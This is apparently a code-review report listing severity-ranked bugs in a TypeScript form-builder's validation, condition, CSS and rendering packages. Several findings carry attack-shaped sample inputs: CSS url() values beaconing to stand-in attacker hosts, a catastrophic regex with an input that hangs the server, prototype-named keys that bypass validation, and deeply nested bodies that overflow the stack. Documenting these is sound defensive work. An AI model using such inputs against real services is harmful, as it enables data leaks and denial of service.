- **[HIGH]** **[E5]** `packages/core/src/rows.ts:405` — `rowScopedRefs` (and `formScopedRefs` at :433) recurse through nested conditions with no depth bound, directly under a comment (:221-230) asserting that everything here is bounded "so an unbounded walk here throws a `RangeError` out of the function whose whole job is never to throw on a document." Evidence: `rowKeys` (:246), `mark` (:262) and `visit` (:272) all thread a `depth` checked against `MAX_TREE_DEPTH`; the two condition walkers at :395-447 take no depth parameter and recurse via `shape['conditions']` and `shape['condition']`. Failure scenario: calling the built `rowScopeProblems` on a root whose single prop holds a 12 000-deep `not` chain threw `RangeError: Maximum call stack size exceeded`. On the `validateDocument` path this is usually pre-empted by the same defect in `tree.ts:936`, but not always — `visitShape` is skipped for a node with a non-string key (`tree.ts:739`) while `rowScopeProblems` still walks that node's props.
- **[MEDIUM]** **[E5]** `packages/core/src/rows.ts:244` — `rowKeys` does not stop descending at a nested repeater, so it credits an outer row with keys that live one row further down; `keyScopesFor`'s `rowKeysOf` in the same file does stop (:179). The two disagree about what a row holds, and the diagnostic gives advice the picker cannot honour. Evidence: `rowKeysOf`'s `gather` returns after `isRowScopeNode(node)` (:177-179); `rowKeys`'s `gather` (:246-250) has no such guard. Failure scenario: with `addresses > { label, contacts > phone }` and `label.renderWhen` testing `phone` at form scope, `rowScopeProblems` reported "*label tests phone, which only exists inside a row. Set the test to read this row*", while `keyScopesFor(root, 'label')` returned `row: ["label","contacts"]` — no `phone`. Taking the stated advice sets `scope: 'row'`, which silences the warning (check 3 at :367 requires `!enclosing.has(ref)`, and `enclosing` wrongly holds `phone`) while the ref still reads nothing — the exact silent-permissive ending this function exists to prevent.
- **[MEDIUM]** **[E5]** `packages/core/src/rows.ts:502` — `applyChange` refuses to write into a row that is not a plain object, but `rowContext` (:136) coerces exactly such a row to `{}` and the renderer draws it, so every keystroke inside that row is silently discarded. Evidence: `rowsOf` (:116) returns the array verbatim including `null` elements; `packages/renderer/src/index.tsx:439-450` maps every element through `<Row value={value}>` → `rowContext`, which turns `null` into `{ values: {} }` and renders the row; `applyChange`'s `place` then hits `row === null` at :502, returns `undefined`, and :514 hands back the input untouched. Failure scenario: `applyChange({addresses:[null,{street:'x'}]}, 'addresses[0].street', 'Main St')` returned the **identical object reference** (`out === data` was `true`), while the same call for index 1 wrote correctly. A saved payload with a null row renders an editable form whose fields cannot be typed into and which reports no error.
- **[LOW]** **[E4]** `packages/core/src/rows.ts:193` — `keyScopesFor` takes the **last** node matching `nodeKey`, contradicting the first-match convention `tree.ts:36-48` establishes for `findNode`, `findParent` and `pathTo`. Evidence: `row = rowKeysOf(enclosing)` is an unconditional assignment inside `visit`, which continues walking the whole tree afterwards (:196). Failure scenario: with duplicate keys — which `validateDocument` reports but cannot prevent — the Properties panel (`packages/designer/src/panels/Properties.tsx:50`) offers the row keys of the last matching node while every other lookup in the session resolves to the first.
- **[LOW]** **[E4]** `packages/core/src/rows.ts:167` — `keyScopesFor` has no `MAX_TREE_DEPTH` bound, unlike `rowScopeProblems` immediately below it. Evidence: `visit` (:190) and `rowKeysOf`'s `gather` (:174) recurse over `children` with no depth argument. Failure scenario: it runs during render at `packages/designer/src/panels/Properties.tsx:50` and `StyleTab.tsx:77`; a document whose `children` nesting exceeds the stack throws inside a React render, which in React 19 unmounts the whole designer rather than one panel. In practice `store.ts:298` gates on `validateDocument`'s 500-level cap, so this is a hazard behind a guard rather than a live bug.
- **[LOW]** **[E4]** `packages/core/src/rows.ts:264` — `mark` excludes a repeater's own data key from `formKeys` (`!isRowScopeNode(node)`), while `keyScopesFor` includes it in `form` (:192). Failure scenario: a node inside a repeater with a `scope: 'row'` ref naming a top-level repeater's data key is not reported by check 3 (:367 requires `formKeys.has(ref)`), even though the panel's own picker lists that name under `form`. Conservative direction — a false negative — but the two functions answer "is this a form key?" differently.
- **[LOW]** **[E2]** `packages/core/src/rows.ts:66` — `encodeRow` interpolates `frame.key` with no grammar check, so a round-trip through `decodeAddress` is not guaranteed. Frames are built from `dataKeyOf(node)` (`packages/renderer/src/index.tsx:447`); a data key containing `.`, `[` or `]` — reported by `validateDocument` but present in any unvalidated document — produces an address `decodeAddress` refuses, so `applyChange` drops every write in that repeater silently. The module docstring (:15-18) rests the whole grammar on `KEY_PATTERN` excluding those characters, but nothing at this boundary enforces it.
- **[LOW]** **[E2]** `packages/core/src/rows.ts:272` — the three condition-scanning blocks at :272-307, :316-339 and :355-380 are near-identical, and blocks 1 and 3 are guarded by the *same* `if (enclosing)` condition, so `props` and `guards` are recomputed and `[node.renderWhen, ...props, ...guards]` is iterated twice per node inside a repeater. Merging blocks 1 and 3 into one loop would remove the duplication and the second allocation.
- **[NOTE]** **[E2]** `packages/core/src/rows.ts:108` — `const key = match[1] as string` and `Number(match[2])` defeat `noUncheckedIndexedAccess`. The regex at :90 does guarantee both groups, so the cast is currently true, but `Number(undefined)` is `NaN` and would mint a frame with a `NaN` index that `encodeRow` writes as `addresses[NaN]` — an assertion that lies rather than a check.

## Area 3 — core: validation, conditions, visibility, context, CSS

## packages/core/src/validation.ts
- **[CRITICAL]** **[E4]** `packages/core/src/validation.ts:705,709` — `validateAcross` merges into a plain object literal with `merged[key] ??= message`, so any error whose key is inherited from `Object.prototype` is silently discarded and the form reports as valid. Evidence: line 705 is `const merged: FormErrors = {}` (line 488 in `validateForm` uses `Object.create(null)` and its comment at 481-487 explains exactly why); `??=` reads `merged['toString']`, gets `Object.prototype.toString` (a function, not nullish), and never assigns. `keys.ts:25` `KEY_PATTERN` accepts `toString`/`valueOf`/`hasOwnProperty`/`__defineGetter__` and `keys.ts:37` `RESERVED_KEYS` lists only `__proto__`/`constructor`/`prototype`, so such a document passes `validateDocument` cleanly — no gate bypass is needed. Failure scenario: a form with a required field keyed `toString`, submitted with that answer missing → `validateForm` returns `{toString: 'This field is required.'}` → `validateAcross` drops it → `apps/demo-server/src/index.ts:333` sees `Object.keys(errors).length === 0` and returns 200 OK. `validateAcross` is on every submit path in the reference server (line 332), not just multi-step ones.
- **[HIGH]** **[E4]** `packages/core/src/validation.ts:134-140,228` — the ReDoS guard treats a *bounded* quantifier wrapping an unbounded one as safe, so catastrophic patterns compile and run. Evidence: `unboundedAt` returns true only for `*`, `+` and `{n,}` (line 139 requires a comma), so for `(a+){10}b` the `)` branch at line 190-191 computes `quantified = unboundedAt(source, i+1)` on `{10}` → false → `nestedUnbounded` returns false and line 231 runs `new RegExp(pattern).test(value)`. The comment at 130-133 asserting a bounded quantifier "is not the shape that goes exponential" is factually wrong, and `docs/build-out/triage.md:31` claims the mitigation removed "every polynomial case" while leaving this exponential one. Failure scenario: a document `pattern: "(a+){10}b"` plus a submitted 4096-character run of `a` → V8 backtracks over C(4095,9) ≈ 3.6e29 partitions → the Node server thread hangs on a synchronous match that cannot be interrupted.
- **[HIGH]** **[E4]** `packages/core/src/validation.ts:322,416` — the host evaluator is invoked with no `try`/`catch` in `guardPasses` and in the `custom` rule, so a throwing expression escapes `validateForm`. Evidence: line 322 `options.evaluate(when.expression, data, options.context)` and line 416 `options.evaluate(rule.expression, data, options.context)` are bare calls; `visibility.ts:34-45` wraps the *same* evaluator in `runs()` and its docblock names this exact incident ("took Preview down in the browser and surfaced as an unhandled 500 on the server"), fixing only the visibility half. Failure scenario: a `custom` rule `data.address.line1.length > 0` against data where `address` is absent → `TypeError` propagates out of `validateForm` → `validateAcross` → the host's submit handler → unhandled 500 / blank form.
- **[MEDIUM]** **[E4]** `packages/core/src/validation.ts:460,534,538` — `validateField` and `validateForm` iterate document-supplied fields with no shape guard, unlike every sibling walk in the package. Evidence: line 460 `for (const rule of node.schema.validations)` has no `Array.isArray`, while `isRequired` at line 447 guards the identical read, and `context.ts:102`, `rows.ts:287` do too; lines 534/538 `for (const child of node.children ?? [])` likewise assume an array where `tree.ts:811` treats a non-array `children` as malformed. Failure scenario: a hand-edited document with `"validations": {}` or `"children": 5` reaching `validateForm` (the codebase's own comment at 482-484 states the validate path never calls `validateDocument`) throws `TypeError: ... is not iterable` on submit.
- **[MEDIUM]** **[E4]** `packages/core/src/validation.ts:228` — a `pattern` rule missing its `value` crashes rather than failing. Evidence: `matchesPattern(rule.value, ...)` passes `undefined` into `nestedUnbounded`, whose loop head at line 166 reads `source.length` → `TypeError: Cannot read properties of undefined`. The preceding line-227 length check guards only the *input*, not the pattern. Failure scenario: `{"key": "pattern", "message": "bad"}` in a document that never went through the gate → every submit 500s; contrast the file's own doctrine at 210-216 that an untrustworthy pattern must *fail*, not throw.
- **[MEDIUM]** **[E4]** `packages/core/src/validation.ts:416` — a `custom` rule inside a repeater row is evaluated against top-level `FormData`, never the row's values, so it silently checks the wrong answers. Evidence: `validateField:459` reads the field's value from `options.row?.values ?? data`, but line 416 passes the outer `data` to the evaluator; `Evaluator` (`types` at line 38 and `docs/spec/09-actions.md:22`) has no row parameter, and `EvalOptions.row` is dropped on the floor here. The renderer fixed the analogous gap for `condition`-bound props (`packages/renderer/src/index.tsx:159-163` passes `options.row`). Failure scenario: a repeater row with a `custom` rule `!data.exempt` where `exempt` exists only per-row → the expression reads a top-level key that does not exist → `!undefined` → `true` → the rule passes for every row.
- **[MEDIUM]** **[E4]** `packages/core/src/validation.ts:415` — a `custom` rule with no injected evaluator returns `undefined`, i.e. passes. Evidence: `if (!options.evaluate) return undefined` before any check; the file header (lines 8-11) and `docs/spec/08-validation.md:151` state this as the contract. Failure scenario: a host that wires an evaluator into the browser renderer but not into its Node submit handler accepts every value a `custom` rule was written to reject, silently. Mitigated only by the host voluntarily calling `evaluatorKeys` at boot (as `apps/demo-server/src/index.ts:315` does); nothing in `validateForm` signals that a rule was skipped.
- **[MEDIUM]** **[E3]** `packages/core/src/validation.ts:707-711` — `validateAcross` multiplies document-controlled scope count by request-controlled row count with no combined bound. Evidence: it runs a full `validateForm` tree walk per scope; the reference server derives those scopes from `contextValues(doc.root, 'step')` (`apps/demo-server/src/index.ts:280`), capped at `MAX_CONTEXT_VALUES = 1000` (`context.ts:223`), while each pass permits `MAX_ROWS = 5000` rows per repeater (line 92). Failure scenario: a document with 1000 distinct `context.step` literals plus a submit carrying a 5000-row repeater → up to ~5,000,000 row-scope rule evaluations for one request; each individual cap passes its own check.
- **[LOW]** **[E4]** `packages/core/src/validation.ts:496,523` — `TOO_MANY_ROWS` overwrites a genuine rule failure recorded against the same address. Evidence: line 496 writes `errors[addressOf(path, node.key)] = error` for the repeater's own rules (e.g. a `required` on the array), then line 523 writes `TOO_MANY_ROWS` to the identical key. Failure scenario: a repeater failing both `required` and the row cap reports only the cap message, losing the more actionable error.
- **[LOW]** **[E4]** `packages/core/src/validation.ts:649` — `submittedData` has neither the `MAX_ROWS` cap nor a recursion bound that `validateForm` has. Evidence: `rows.map(...)` at 649 and `collect(child, scope, into)` at 655/666 are unbounded, while `validateForm:522` refuses over `MAX_ROWS`. Failure scenario: a host that calls `submittedData` without validating first (the function is exported independently and its docblock presents it as a submit-time projection) does unbounded work on a hostile body.
- **[NOTE]** **[E2]** `packages/core/src/validation.ts:74-86,107-115,281-293,467` — four doc comments are orphaned: each is immediately followed by another doc comment, so it documents nothing and no editor will surface it. Evidence: the `UNREADABLE_RULE` docblock (74-86) sits above the `MAX_ROWS` docblock; "A pattern rule, compiled defensively" (107-115) sits above `PATTERN_INPUT_LIMIT`'s; the `comparableNumber` docblock (281-293) sits above `isUrl`'s (so `comparableNumber` at 308 is undocumented and `isUrl` carries the wrong neighbour); and line 467's one-liner sits above `validateForm`'s real docblock.

## packages/core/src/condition.ts
- **[HIGH]** **[E4]** `packages/core/src/condition.ts:33` — `same` does not propagate `depth` through the array branch, so `MAX_DEPTH` is not enforced at all for nested arrays. Evidence: line 33 is `return a.every((item, i) => same(item, b[i]))` with no third argument, so `depth` resets to its default `0` at every array level, while the object branch at line 43 correctly passes `depth + 1`; the guard at line 23 therefore never fires. Failure scenario: an `eq` comparing two `ref` operands, with a submitted body holding `{"a": [[[[…20000 deep…]]]], "b": [[[[…]]]]}` → unbounded recursion → `RangeError: Maximum call stack size exceeded` out of `isVisible` → the exact unhandled-500/blank-form outcome the `MAX_DEPTH` docblock (46-58) exists to rule out. The same defect reaches `context.ts:245`, where `contextValues` calls `same` on document literals at host startup.
- **[HIGH]** **[E4]** `packages/core/src/condition.ts:280` — `evaluate` does not propagate `depth` through `and`/`or`, so `MAX_DEPTH` bounds only chains of `not`. Evidence: line 280 `evaluate(inner, data, context, row)` omits the fifth argument while line 287 (`not`) passes `depth + 1`; the check at line 193 therefore sees `0` at every `and`/`or` level. The gate cannot save it either: `validateDocument`'s own condition walk (`tree.ts:936-951`) recurses with no depth parameter. Failure scenario: `renderWhen: {kind:'condition', condition:{op:'and', conditions:[{op:'and', conditions:[…~4000 deep…]}]}}` — trivially authored in JSON, and `context.ts:39` names `{ and: [{ and: [ ... ] }] }` as the canonical case — throws `RangeError` from both the gate and the renderer.
- **[MEDIUM]** **[E4]** `packages/core/src/condition.ts:257` — the `in`/`notIn` branch answers `false` for a malformed `options` where every other unreadable case answers `undefined`, and `not` then inverts it. Evidence: line 257 `if (!Array.isArray(condition.options)) return false`; line 289 `return inner === undefined ? undefined : !inner` turns that `false` into `true`. The comment at 250-254 states the intent as "malformed is false in both directions, or a broken `notIn` would show the component", and the file header (170-181) says unreadable must not be collapsed to false precisely because `not` inverts it. Failure scenario: `{op:'not', condition:{op:'notIn', value:{kind:'ref',dataKey:'x'}, options:"oops"}}` as `renderWhen` → `evaluate` returns `false` → `not` returns `true` → the component is shown on a rule the code could not read.
- **[MEDIUM]** **[E3]** `packages/core/src/condition.ts:145-150` — `order` refuses a number/string pair while `validation.ts:308-311` coerces one, so the same answer satisfies a numeric rule and fails the equivalent condition. Evidence: line 149 requires *both* operands to be strings and line 145 both to be numbers, returning `undefined` (→ `false` at line 223) otherwise; `comparableNumber` deliberately does the opposite, and its comment at 290-292 records that a number field's value "legitimately arrives as a string from an `<input>`". Failure scenario: `age` submitted as `"20"` (an `<input type=number>` value) → `min: 18` passes → `{op:'gte', left:{kind:'ref',dataKey:'age'}, right:{kind:'literal',value:18}}` is `false` → the dependent component is hidden and, per `validateForm:491`, it and its whole subtree leave validation, so its required fields never run.
- **[NOTE]** **[E2]** `packages/core/src/condition.ts:280` — `and`/`or` evaluate every branch eagerly via `.map` before inspecting any result, so neither short-circuits; a `false` first conjunct still walks the remaining subtree, including any `readPath` and deep `same` calls under it.

## packages/core/src/visibility.ts
- **[MEDIUM]** **[E4]** `packages/core/src/visibility.ts:40-44` — `runs` maps every evaluator throw to "hidden", which on the server removes the node and its entire subtree from validation. Evidence: the bare `catch { return false }` cannot distinguish "the condition is false" from "the sandbox is broken", and `validateForm:491` returns immediately on `!isVisible`, skipping the node's rules and all its children. The docblock's justification — that this "agrees with what the renderer draws" — holds only for `renderWhen`: `resolveProp`'s `computed` case (`packages/renderer/src/index.tsx:167`) has no `catch`, so a throwing expression on a *prop* still crashes the render. Failure scenario: a `computed` renderWhen whose expression dereferences a field absent from a particular submission → throws → section reads hidden → its required fields are never checked and the submit is accepted; nothing in the returned `FormErrors` records that anything was skipped.
- **[LOW]** **[E3]** `packages/core/src/visibility.ts:41` — a `computed` `renderWhen` inside a repeater row is evaluated against top-level `data`, silently ignoring the row. Evidence: line 41 calls `evaluate(expression, data, options.context)` and `Evaluator` (`validation.ts:38`) has no row parameter, while the sibling `condition` case at line 78 does pass `options.row` to `evaluateCondition`. Failure scenario: a field inside a repeater whose visibility expression reads a per-row answer → the expression reads the (usually absent) top-level key instead → falsy → hidden in every row → those fields are never validated, with nothing in the document looking wrong. `rows.ts:206-219` documents this exact quiet failure for structured refs and has no equivalent detection for expressions.

## packages/core/src/context.ts
- **[MEDIUM]** **[E4]** `packages/core/src/context.ts:105,155,302` — all three node-tree walks recurse without a depth bound, in functions whose docblocks promise totality on an unvalidated document. Evidence: `visit(child)` at 105, `walkNode(child)` at 155 and `walkNode(child)` at 302 pass no depth, while the *condition* walks in the very same file are bounded by `MAX_CONDITION_DEPTH` (39, 63, 65, 274) and `rows.ts:230` bounds its node walks with `MAX_TREE_DEPTH = 500` for the identical reason. The docblocks at 88-90, 130-132 and 279-283 each state these run "at a host's startup, before anything has refused the document". Failure scenario: an imported document nested ~4000 `children` deep → `contextKeys`/`evaluatorKeys` throw `RangeError` at boot, in the code path a host is told to use to *detect* a bad document.
- **[LOW]** **[E4]** `packages/core/src/context.ts:153` — `evaluatorKeys` silently omits any node whose `key` is not a string, so the boot-time sandbox check under-reports on the malformed documents it claims to handle. Evidence: `if (expression && typeof node.key === 'string') keys.add(node.key)` — the `expression` flag is computed and then discarded when the key is not text. Failure scenario: a node with `"key": 42` and a `computed` renderWhen → `evaluatorKeys` returns `[]` → `apps/demo-server/src/index.ts:316` waves the document through → `isVisible` reads the node as hidden for want of an evaluator → it and its subtree are never validated, which is precisely the failure the function's docblock (112-131) says it exists to prevent.
- **[NOTE]** **[E4]** `packages/core/src/context.ts:245` — `contextValues`'s dedup calls `same`, which carries the unbounded array recursion from `condition.ts:33`, so a document literal holding a deeply nested array can blow the stack inside a function documented as safe to call before the gate.
- **[NOTE]** **[E2]** `packages/core/src/context.ts:96-99,141-145,293-297` — the same six-line "props, if props is a non-array object" guard is written out verbatim three times in this file and twice more in `rows.ts:276-279,318-321,357-360`; a change to the shape check has five places to reach.

## packages/core/src/css.ts
- **[MEDIUM]** **[E3]** `packages/core/src/css.ts:71,206` — `FORBIDDEN` does not check quote balance, so a declaration block ending inside an unterminated CSS string swallows the closing `}` and every rule concatenated after it. Evidence: the regex `/[{}<@]|\/\*|\*\//` passes `color:"abc`, which line 206 wraps as `[data-fs-key="x"]{color:"abc}`; per CSS tokenization a string token runs to the next `"`, so the `}` and the following selectors are consumed as string contents and the block is never closed. This is the same "one node's declarations swallow another's rule" failure the `/*` refusal was added for, described at lines 58-67, arriving through a character that regex does not cover. Failure scenario: an author (or an imported document) writes a stray quote in one component's Style tab → the Style tab reports the text as accepted → every component whose rules were emitted after it loses its styling, with nothing indicating why. The one check that would settle the exact extent: feed the concatenated sheet to a CSS parser and count surviving rules.
- **[MEDIUM]** **[E4]** `packages/core/src/css.ts:71 vs 120` — a document's raw CSS block may issue arbitrary outbound fetches, while the single-value sink refuses them by name as an exfiltration channel. Evidence: `FORBIDDEN` contains no `url`/`image-set`/`element`/`cross-fade`, so `safeDeclarations('background:url(https://evil.example/beacon)')` returns the text unchanged and `styleSheetFor` emits it; `FETCHING` at line 120 is consulted only by `safeStyleValue` (line 137). This is documented as deliberate at lines 105-119 ("The Style tab remains the channel for real CSS") and in `docs/spec/01-document-model.md:131-138`, so it is a stated design choice — but the justification given at 108-114 ("on a page whose whole purpose is collecting answers … an exfiltration channel") applies unchanged to this sink. Failure scenario: an untrusted imported document sets `css.any` on the form root to `background:url(https://attacker/hit?id=…)` → every visitor to the rendered form makes an off-origin request, with no `@`, `{`, `}` or `<` to trip the refusal.
- **[MEDIUM]** **[E4]** `packages/core/src/css.ts:342-344` — `setDeclaration` moves the edited declaration to the end of the block, contradicting its own docblock's "Order is preserved". Evidence: line 342 filters the existing entry out and line 344 `declarations.push(...)` re-appends it; no test asserts position (`css.test.ts:245-249` checks only the value and the absence of a duplicate). Failure scenario: a block `background: red; background-color: blue` (blue wins) edited through the `background` control becomes `background-color: blue; background: green` — the shorthand now resets the longhand, so a control that "only ever touches its own declaration" changed the computed value of one it did not touch.
- **[MEDIUM]** **[E4]** `packages/core/src/css.ts:82-83` — `safeDeclarations` calls `.trim()` on whatever the document holds, so a non-string CSS entry throws instead of being refused. Evidence: `if (!text) return undefined` passes any truthy value through to `text.trim()`; `styleSheetFor:205,209` feeds it `css.any` / `css[name]` straight from `node.css`, and `validateDocument` (`tree.ts:1002`) only *reports* a non-string there rather than refusing the render. Failure scenario: `"css": {"any": 5}` → `TypeError: text.trim is not a function` inside the `useMemo` at `packages/renderer/src/index.tsx:607` → React 19 unmounts the whole form, not one node.
- **[LOW]** **[E3]** `packages/core/src/css.ts:200` — `styleSheetFor` walks the tree via `walk`, which is neither guarded nor bounded. Evidence: `tree.ts:31` is `for (const child of n.children ?? []) visit(child, n)` — a non-array `children` throws "is not iterable" and deep nesting throws `RangeError`; the renderer hardened its sibling layer for exactly this (`packages/renderer/src/index.tsx:193-196`, "one node missing `props` used to take the whole form with it") but the stylesheet path was left unguarded.

## Area 4 — the runtime renderer and the MUI kit

## packages/renderer/src/index.tsx
- **[HIGH]** **[E4]** `packages/renderer/src/index.tsx:459` — `NodeBoundary` wraps only the kit's `<Component>`, not `RenderNode`'s own render body, so the "one node's blast radius" guarantee in its doc comment (lines 240-259) does not hold and the document root has no boundary at all. Evidence: the boundary element is created *inside* `RenderNode`'s return, after lines 353-456 have already run `resolveProps`, `isVisible`, `dataKeyOf`, `valueOf`, `rowsOf` and `node.children?.map`; a child `RenderNode` is rendered as a descendant of its **parent's** boundary, and the root `RenderNode` (line 621) is a direct child of `Ctx.Provider` with nothing above it. Failure scenario: a computed prop on any child throws → the *parent's* boundary catches → the parent and every sibling field is replaced by one error box, every answer already typed in them is lost, and `onError` reports the parent's key rather than the failing node's; the same throw on `document.root` propagates out of `FormRenderer` and React 19 unmounts the host's whole page — precisely the outcome lines 243-245 claim to prevent.
- **[HIGH]** **[E4]** `packages/renderer/src/index.tsx:169` — the host evaluator is called with no `try`/`catch`, unlike every other render-time evaluator call site in the project. Evidence: `return options.evaluate ? options.evaluate(value.expression, data, options.context) : null` vs `packages/core/src/visibility.ts:34-45`, whose `runs()` wrapper exists because "an uncaught throw … took Preview down in the browser and surfaced as an unhandled 500 on the server". Failure scenario: a valid document with `{ kind: 'computed', expression: 'user.profile.name' }` and a host evaluator that dereferences null throws during `resolveProps`, which per the finding above is outside the node's own boundary — the parent subtree (or the entire host page, at the root) is destroyed by an expression an author is still typing.
- **[MEDIUM]** **[E4]** `packages/renderer/src/index.tsx:144` — `resolveProp` dereferences `value.kind` without checking that `value` is an object, so the "total over an untrusted document" claim at lines 194-198 stops one level short. Evidence: line 200 guards that `node.props` is a non-array object, then line 203 iterates `Object.entries(props)` and hands each *value* straight to line 144; `null.kind` throws. Failure scenario: a document row holding `"props": { "label": null }` (which `validateDocument` reports as `malformed`, but hosts are explicitly told at line 570-572 they may skip it) throws a `TypeError` during render, taking out the parent subtree or the host page.
- **[MEDIUM]** **[E4]** `packages/renderer/src/index.tsx:451` — `node.children?.map(...)` assumes `children` is an array, while core guards the identical shape everywhere it walks a document (`packages/core/src/rows.ts:241`, `packages/core/src/tree.ts:807`). Evidence: line 451 and line 456 both call `.map` after only an optional-chain null check. Failure scenario: `"children": "root"` in an untrusted document → `node.children.map is not a function`; `"children": [null]` → `child.key` on `null` throws — both during render, both outside this node's boundary.
- **[MEDIUM]** **[E3]** `packages/renderer/src/index.tsx:439` — the repeater row count is unbounded in the renderer while validation refuses to check past 5000. Evidence: `rowsOf(valueOf(...))` has no cap, whereas `packages/core/src/validation.ts:522` returns `TOO_MANY_ROWS` above `MAX_ROWS = 5000`. Failure scenario: a restored draft or another tenant's row holding `{"addresses": [ …200 000 items… ]}` makes the renderer build 200 000 copies of the authored subtree and hang the tab, so the "This list has too many rows to check." message the repeater is designed to display never gets painted.
- **[MEDIUM]** **[E4]** `packages/renderer/src/index.tsx:268` — `NodeBoundary` never clears `failed`, so a node that throws once stays an error box for the life of the mount. Evidence: the class has only `getDerivedStateFromError` and `componentDidCatch`; there is no `componentDidUpdate`, no `getDerivedStateFromProps` reset, and `RenderNode` gives the boundary no `key`, while the `RenderNode` above it is keyed on the stable `node.key` (line 452/456). - **[LOW]** **[E4]** `packages/renderer/src/index.tsx:440` — `revealHidden && repeats && rows.length === 0 ? [{}] : rows` allocates a fresh array *and* a fresh object on every render, defeating the memoisation `Row` was written to provide. Evidence: `Row`'s `useMemo` (line 338) lists `value` in its dependencies, and the doc comment at lines 315-322 records that a changing row identity "re-ran `isVisible` and `resolveProps` for every node beneath it on every keystroke". - **[LOW]** **[E2]** `packages/renderer/src/index.tsx:288-292` — the boundary's fallback carries `data-fs-key`, `data-fs-type` and `data-fs-scope` but not `data-fs-row` or `data-fs-hidden`, which the same file (lines 84-89) says a click has to land on exactly one of. Failure scenario: a host that skips `validateDocument` with `translations: { en: { greeting: { a: 1 } } }` hands an object to a kit as a label; both in-repo kits swallow it to `''` via `str()`, so the label silently disappears rather than reporting.

## packages/kit-mui/src/renderers.tsx
- **[MEDIUM]** **[E4]** `packages/kit-mui/src/renderers.tsx:770` — `ProgressNode` narrows with a bare `typeof raw === 'number'` instead of the `num()` helper, so `NaN` survives to MUI. Evidence: `typeof NaN === 'number'` → `determinate` is `true` → `Math.min(100, Math.max(0, NaN))` is `NaN`; MUI's `LinearProgress` then sets `aria-valuenow={Math.round(value)}` and `transform: translateX(${value - 100}%)`, both `NaN`. This is verbatim the failure `num`'s own comment at lines 59-67 says was fixed ("reached `aria-valuenow=\"NaN\"` and an inline width of `NaN%` … so an indeterminate progress bar painted itself full and told a screen reader a number that is not one") — the fix was applied to the helper and never to the one call site that needed it. Failure scenario: a `computed` binding evaluating `data.done / data.total` with `total: 0` returns `NaN` → the browser drops the invalid transform, the bar paints 100% complete, and a screen reader announces `aria-valuenow="NaN"`.
- **[MEDIUM]** **[E4]** `packages/kit-mui/src/renderers.tsx:327` — the required marking on `Select` lands on an `aria-hidden` element and is never announced, and the contract test passes on it. Evidence: `requiredProps(node)` goes to `slotProps.htmlInput`; MUI 6.5 `TextField.js:142/193/227` routes `htmlInput` into `InputElement`'s `inputProps`, which for `select` is cloned into `SelectInput` — `Select/SelectInput.js:471-477` spreads the leftover `...other` onto `SelectNativeInput`, which is rendered with `aria-hidden: true` and `tabIndex: -1`, while the `role="combobox"` element at line 445-453 takes `aria-required` only from its own `required` prop, and `Select/Select.js:76-79` reads only `['variant','error']` from `FormControl` — so `required` is never set. Failure scenario: a required Select is silent to a screen reader; `test/kit-contract.test.tsx:352-372` still passes because `control()` (line 311-315) grabs the first `input`, which is the hidden native one.
- **[MEDIUM]** **[E4]** `packages/kit-mui/src/renderers.tsx:619` — `RadioItemNode` always passes an explicit boolean `disabled`, which blocks MUI's inheritance chain. Evidence: `bool()` (line 58) returns `false`, never `undefined`, and `FormControlLabel.js:135` resolves `const disabled = disabledProp ?? control.props.disabled ?? muiFormControl?.disabled` — an explicit `false` short-circuits both fallbacks, whereas the `options`-driven `FormControlLabel`s at lines 589-597 pass no `disabled` and do inherit. Failure scenario: a `RadioGroup` with `disabled: true` and a mix of `options` and `RadioItem` children renders the options greyed out and the children fully interactive, so a "disabled" question is still answerable.
- **[MEDIUM]** **[E4]** `packages/kit-mui/src/renderers.tsx:126` — `gap` means an MUI spacing multiple on `Screen`, `Stack`, `Step` and `Repeater` (lines 126, 134, 154/168, 183) but pixels on `Grid` (line 369, through `px()` at 378), and pixels in the other kit. Evidence: `packages/kit-mui/src/definitions.ts` defaults gap to `2` at lines 50, 63, 245, 267 and to `16` at 209, while `packages/kit-html/src/definitions.ts` defaults all of them to `16`. Failure scenario: a document authored against `kit-html` (`gap: 16`) rendered against `kit-mui` — which `docs/spec/02-kit-contract.md:141-143` states the playground does at runtime on one document — draws 128px gaps instead of 16px; this is the same "made the same document lay out differently in the two kits" defect that `px()`'s own comment (lines 71-88) says was fixed for padding, radius and grid gap.
- **[MEDIUM]** **[E4]** `packages/kit-mui/src/renderers.tsx:742` — oversized files are dropped with nothing on screen saying so. Evidence: line 740 filters by `file.size <= limit` and line 742 calls `onChange(multiple ? files : (files[0] ?? null))`; when every chosen file exceeds `maxSize`, `files` is empty, the value becomes `null`/`[]`, `filesHeld` (line 688-690) is `''`, and `helperText` (line 712) falls back to the authored helper text. Failure scenario: a user picks a 10MB PDF under `maxSize: 2048`; the native input still renders "report.pdf", the helper text is unchanged, and the form submits no file — the quiet-failure class this repo is explicitly organised against.
- **[MEDIUM]** **[E2]** `packages/kit-mui/src/renderers.tsx:275` — UNCERTAIN: the accessibility wiring on `Checkbox` (line 275) and `Switch` (line 539) rides on `inputProps`, and `CardHeader` (line 415) on `titleTypographyProps`, all of which MUI 6.5's own typings mark `@deprecated … This prop will be removed in v7` (`internal/SwitchBase.d.ts:81`, `CardHeader/CardHeader.d.ts:150`), while `packages/kit-mui/package.json` declares `"@mui/material": "^6.0.0 || ^7.0.0"`. Failure scenario: a host on MUI 7 gets a checkbox and switch whose `aria-describedby`, `aria-invalid` and `aria-required` silently stop being emitted — a contract violation with no error. - **[LOW]** **[E4]** `packages/kit-mui/src/renderers.tsx:190` — `str(props['level'], 'h5') as Variant` is an unchecked assertion over document data, in a file that narrows every other enumerated prop (`variant` at 357-358, `fit` at 460, `align` at 438, `severity` at 750-751). Evidence: the cast is the only thing standing between `props['level']` and MUI's `variantMapping[variant] || 'span'`. Failure scenario: `level: "body2"` renders a `<p>` and `level: "x"` a `<span>` with class `MuiTypography-x`, so a Heading silently stops being a heading in the accessibility tree — no warning, and no contract test covers it.
- **[LOW]** **[E4]** `packages/kit-mui/src/renderers.tsx:472` — `width: width > 0 ? width : '100%'` hands a raw number to `sx.width`, which MUI reinterprets. Failure scenario: `Image.width = 1` renders `width: 100%`, and `0.5` renders `50%`, against a palette hint (`definitions.ts:406`) that says only "Zero means full width" — the exact class of sx number reinterpretation `px()` was added to this file to stop.
- **[LOW]** **[E2]** `packages/kit-mui/src/renderers.tsx:712` — `'Holding ' + filesHeld` is hard-coded English, in a kit whose `Select` placeholder comment (lines 330-337) calls a hard-coded English string a defect worth fixing ("The HTML kit had one and hardcoded its English; both now read the authored `placeholder`"). Failure scenario: a form localised to French shows "Holding contrat.pdf" under the file input, and no prop can change it.
